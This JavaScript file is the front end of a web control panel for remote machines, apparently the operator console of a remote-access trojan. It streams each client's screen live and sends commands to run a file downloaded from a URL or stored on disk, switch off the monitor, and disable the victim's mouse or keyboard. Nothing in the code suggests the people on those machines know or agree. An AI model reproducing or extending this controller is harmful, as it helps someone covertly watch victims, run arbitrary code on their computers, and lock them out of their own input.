// Connect to SocketIO
const socket = io();

// Client data
let clientData = null;
let screenStreamEnabled = false;
let frameCount = 0;
let lastFpsUpdate = Date.now();
let fps = 0;
const targetFps = 30; // 30 fps target
const frameInterval = 1000 / targetFps; // ~33ms per frame
let lastFrameTime = 0;

// Canvas and context
let canvas = null;
let ctx = null;

// Initialize on page load
document.addEventListener('DOMContentLoaded', () => {
    canvas = document.getElementById('screen-canvas');
    ctx = canvas.getContext('2d');
    
    loadClientData();
    setupEventListeners();
    setupSocketListeners();
    setupContextMenu();
});

// Load client data
async function loadClientData() {
    try {
        const response = await fetch(`/api/client/${clientId}`);
        clientData = await response.json();
        updateClientInfo();
    } catch (error) {
        console.error('Error loading client data:', error);
    }
}

// Setup event listeners
function setupEventListeners() {
    // Context menu
    document.addEventListener('contextmenu', (e) => {
        e.preventDefault();
        showContextMenu(e);
    });
    
    document.addEventListener('click', (e) => {
        // Don't close if clicking inside context menu
        const contextMenu = document.getElementById('context-menu');
        if (contextMenu && contextMenu.contains(e.target)) {
            return;
        }
        hideContextMenu();
    });
}

// Setup SocketIO listeners
function setupSocketListeners() {
    socket.on('connect', () => {
        console.log('Connected to server');
    });

    socket.on('screen_frame', (data) => {
        if (data.client_id === clientId && screenStreamEnabled) {
            displayScreenFrame(data.image);
        }
    });

    socket.on('command_response', (response) => {
        if (response.client_id === clientId) {
            displayCommandResponse(response);
        }
    });

    socket.on('client_update', (updatedClients) => {
        if (clientId in updatedClients) {
            clientData = updatedClients[clientId];
            updateClientInfo();
        }
    });

    socket.on('disconnect', () => {
        console.log('Disconnected from server');
    });
}

// Update client info
function updateClientInfo() {
    if (!clientData) return;
    
    // Update header
    document.getElementById('client-title').textContent = clientData.hostname;
    
    const statusDot = document.getElementById('status-indicator');
    const statusText = document.getElementById('status-text');
    
    if (clientData.online) {
        statusDot.classList.add('online');
        statusText.textContent = 'ONLINE';
    } else {
        statusDot.classList.remove('online');
        statusText.textContent = 'OFFLINE';
    }
    
    // Update info panel
    document.getElementById('info-hostname').textContent = clientData.hostname;
    document.getElementById('info-ip').textContent = clientData.ip;
    document.getElementById('info-os').textContent = clientData.os;
    document.getElementById('info-client-id').textContent = clientId;
    document.getElementById('info-last-seen').textContent = new Date(clientData.last_seen).toLocaleString();
    document.getElementById('info-registered').textContent = clientData.registered_at ? new Date(clientData.registered_at).toLocaleString() : 'N/A';
}

// Toggle screen stream
function toggleScreenStream() {
    const toggle = document.getElementById('screen-toggle');
    screenStreamEnabled = toggle.checked;
    
    socket.emit('toggle_screen_stream', {
        client_id: clientId,
        enabled: screenStreamEnabled
    });
    
    if (screenStreamEnabled) {
        document.getElementById('screen-overlay').style.display = 'flex';
        document.getElementById('screen-overlay').textContent = 'Waiting for screen data...';
        frameCount = 0;
        lastFpsUpdate = Date.now();
    } else {
        document.getElementById('screen-overlay').style.display = 'flex';
        document.getElementById('screen-overlay').textContent = 'Toggle to enable screen streaming';
        ctx.clearRect(0, 0, canvas.width, canvas.height);
    }
}

// Display screen frame with quality optimization
function displayScreenFrame(imageData) {
    if (!imageData) return;
    
    const now = Date.now();
    
    // Frame rate limiting - only process if enough time has passed
    if (now - lastFrameTime < frameInterval) {
        return;
    }
    
    lastFrameTime = now;
    
    const img = new Image();
    img.onload = () => {
        try {
            // Set canvas size to match image
            canvas.width = img.width;
            canvas.height = img.height;
            
            // Enable high quality image rendering
            ctx.imageSmoothingEnabled = true;
            ctx.imageSmoothingQuality = 'high';
            
            // Draw image
            ctx.drawImage(img, 0, 0);
            
            // Hide overlay
            document.getElementById('screen-overlay').style.display = 'none';
            
            // Update FPS counter
            frameCount++;
            const elapsed = now - lastFpsUpdate;
            
            if (elapsed >= 1000) {
                fps = frameCount;
                document.getElementById('fps-counter').textContent = `${fps} FPS`;
                frameCount = 0;
                lastFpsUpdate = now;
            }
        } catch (error) {
            console.error('Error drawing frame:', error);
        }
    };
    
    img.onerror = () => {
        console.error('Failed to load image');
    };
    
    // Convert base64 to image
    img.src = 'data:image/png;base64,' + imageData;
}

// Execute command from context menu
function contextExecuteCommand(command) {
    if (event) {
        event.stopPropagation();
    }
    
    socket.emit('send_command', {
        target: clientId,
        command: command
    });
    
    document.getElementById('command-output').textContent = `Executing: ${command}...`;
    document.getElementById('command-output').classList.remove('success', 'error');
    hideContextMenu();
}

// Display command response
function displayCommandResponse(response) {
    const outputDiv = document.getElementById('command-output');
    
    if (response.success) {
        outputDiv.classList.add('success');
        outputDiv.classList.remove('error');
        outputDiv.textContent = response.output || 'Command executed successfully';
    } else {
        outputDiv.classList.add('error');
        outputDiv.classList.remove('success');
        outputDiv.textContent = response.output || 'Command failed';
    }
}

// Context menu
let contextMenu = null;

function setupContextMenu() {
    contextMenu = document.getElementById('context-menu');
}

function showContextMenu(e) {
    e.preventDefault();
    
    // Update information tab
    if (clientData) {
        document.getElementById('ctx-hostname').textContent = clientData.hostname || '-';
        document.getElementById('ctx-ip').textContent = clientData.ip || '-';
        document.getElementById('ctx-os').textContent = clientData.os || '-';
        document.getElementById('ctx-status').textContent = clientData.online ? 'ONLINE' : 'OFFLINE';
    }
    
    contextMenu.style.left = e.clientX + 'px';
    contextMenu.style.top = e.clientY + 'px';
    contextMenu.classList.add('active');
    
    // Reset to main tab
    switchContextTab('main');
}

function hideContextMenu() {
    if (contextMenu) {
        contextMenu.classList.remove('active');
    }
}

function switchContextTab(tabName) {
    // Prevent event bubbling
    if (event) {
        event.stopPropagation();
    }
    
    // Hide all tabs
    document.querySelectorAll('.context-tab-content').forEach(tab => {
        tab.classList.remove('active');
    });
    
    // Remove active from all buttons
    document.querySelectorAll('.context-tab-btn').forEach(btn => {
        btn.classList.remove('active');
    });
    
    // Show selected tab
    const selectedTab = document.getElementById(`context-${tabName}`);
    if (selectedTab) {
        selectedTab.classList.add('active');
    }
    
    // Activate button - find the clicked button
    const buttons = document.querySelectorAll('.context-tab-btn');
    buttons.forEach(btn => {
        const btnText = btn.textContent.toLowerCase();
        if ((tabName === 'main' && btnText.includes('main')) ||
            (tabName === 'commands' && btnText.includes('commands')) ||
            (tabName === 'info' && btnText.includes('information'))) {
            btn.classList.add('active');
        }
    });
}

function contextAction(action) {
    if (event) {
        event.stopPropagation();
    }
    
    switch(action) {
        case 'view':
            // Already on view page
            break;
        case 'screenshot':
            document.getElementById('screen-toggle').checked = true;
            toggleScreenStream();
            break;
        case 'connect':
            alert('Client is already connected');
            break;
    }
    hideContextMenu();
}

// Update context menu item handlers
document.addEventListener('DOMContentLoaded', () => {
    const contextItems = document.querySelectorAll('.context-item');
    contextItems.forEach(item => {
        item.addEventListener('click', () => {
            hideContextMenu();
        });
    });
});


// Popup Dialog Functions
function showDialog(dialogId) {
    const dialog = document.getElementById(dialogId);
    const overlay = document.getElementById('popup-overlay');
    if (dialog && overlay) {
        dialog.classList.add('active');
        overlay.classList.add('active');
    }
}

function closeDialog(dialogId) {
    const dialog = document.getElementById(dialogId);
    const overlay = document.getElementById('popup-overlay');
    if (dialog && overlay) {
        dialog.classList.remove('active');
        overlay.classList.remove('active');
    }
}

function showUrlDialog() {
    if (event) event.stopPropagation();
    showDialog('url-dialog');
}

function showDiskDialog() {
    if (event) event.stopPropagation();
    showDialog('disk-dialog');
}

function showMonitorDialog() {
    if (event) event.stopPropagation();
    showDialog('monitor-dialog');
}

function showMouseDialog() {
    if (event) event.stopPropagation();
    showDialog('mouse-dialog');
}

function showKeyboardDialog() {
    if (event) event.stopPropagation();
    showDialog('keyboard-dialog');
}

// Execute Custom Commands
function executeUrlCommand() {
    const url = document.getElementById('url-input').value.trim();
    if (!url) {
        alert('Please enter a URL');
        return;
    }
    
    socket.emit('send_command', {
        target: clientId,
        command: `execute_url:${url}`
    });
    
    document.getElementById('command-output').textContent = `Executing file from URL: ${url}...`;
    document.getElementById('command-output').classList.remove('success', 'error');
    closeDialog('url-dialog');
    document.getElementById('url-input').value = '';
    hideContextMenu();
}

function executeDiskCommand() {
    const path = document.getElementById('disk-input').value.trim();
    if (!path) {
        alert('Please enter a file path');
        return;
    }
    
    socket.emit('send_command', {
        target: clientId,
        command: `execute_disk:${path}`
    });
    
    document.getElementById('command-output').textContent = `Executing file from disk: ${path}...`;
    document.getElementById('command-output').classList.remove('success', 'error');
    closeDialog('disk-dialog');
    document.getElementById('disk-input').value = '';
    hideContextMenu();
}

function executeMonitorCommand() {
    const time = document.getElementById('monitor-time').value.trim();
    if (!time || isNaN(time) || time < 1) {
        alert('Please enter a valid duration in seconds');
        return;
    }
    
    socket.emit('send_command', {
        target: clientId,
        command: `turn_off_monitor:${time}`
    });
    
    document.getElementById('command-output').textContent = `Monitor will turn off in ${time} seconds...`;
    document.getElementById('command-output').classList.remove('success', 'error');
    closeDialog('monitor-dialog');
    document.getElementById('monitor-time').value = '60';
    hideContextMenu();
}

function executeMouseCommand() {
    const time = document.getElementById('mouse-time').value.trim();
    if (!time || isNaN(time) || time < 1) {
        alert('Please enter a valid duration in seconds');
        return;
    }
    
    socket.emit('send_command', {
        target: clientId,
        command: `disable_mouse:${time}`
    });
    
    document.getElementById('command-output').textContent = `Mouse will be disabled for ${time} seconds...`;
    document.getElementById('command-output').classList.remove('success', 'error');
    closeDialog('mouse-dialog');
    document.getElementById('mouse-time').value = '60';
    hideContextMenu();
}

function executeKeyboardCommand() {
    const time = document.getElementById('keyboard-time').value.trim();
    if (!time || isNaN(time) || time < 1) {
        alert('Please enter a valid duration in seconds');
        return;
    }
    
    socket.emit('send_command', {
        target: clientId,
        command: `disable_keyboard:${time}`
    });
    
    document.getElementById('command-output').textContent = `Keyboard will be disabled for ${time} seconds...`;
    document.getElementById('command-output').classList.remove('success', 'error');
    closeDialog('keyboard-dialog');
    document.getElementById('keyboard-time').value = '60';
    hideContextMenu();
}

// Close dialogs when clicking overlay
document.addEventListener('DOMContentLoaded', () => {
    const overlay = document.getElementById('popup-overlay');
    if (overlay) {
        overlay.addEventListener('click', () => {
            document.querySelectorAll('.popup-dialog.active').forEach(dialog => {
                dialog.classList.remove('active');
            });
            overlay.classList.remove('active');
        });
    }
});
